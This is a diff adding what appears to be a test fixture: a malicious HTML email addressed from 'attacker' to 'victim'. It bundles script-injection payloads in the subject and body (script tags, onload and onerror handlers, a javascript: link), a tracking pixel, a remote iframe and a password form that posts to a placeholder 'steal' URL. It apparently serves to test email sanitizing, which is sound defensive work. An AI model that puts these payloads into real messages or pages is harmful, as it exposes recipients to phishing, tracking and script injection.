@@ -1,0 +1,26 @@
+From: attacker@example.com
+To: victim@example.com
+Subject: <img src=x onerror=alert(1)> urgent
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============2452888525172210467=="
+
+--===============2452888525172210467==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+See the HTML part.
+
+--===============2452888525172210467==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><head><style>body{background:url(https://example.com/css.png)}</style><=
+script>alert('mail')</script></head><body onload=3D"alert('onload')"><p>Track=
+ing pixel:</p><img src=3D'https://example.com/pixel.gif?id=3Dvictim'><a href=
+=3D'javascript:alert(1)'>click me</a><form action=3D'https://example.com/stea=
+l'><input name=3D'password'></form><iframe src=3D'https://example.com/frame'>=
+</iframe></body></html>
+
+--===============2452888525172210467==--
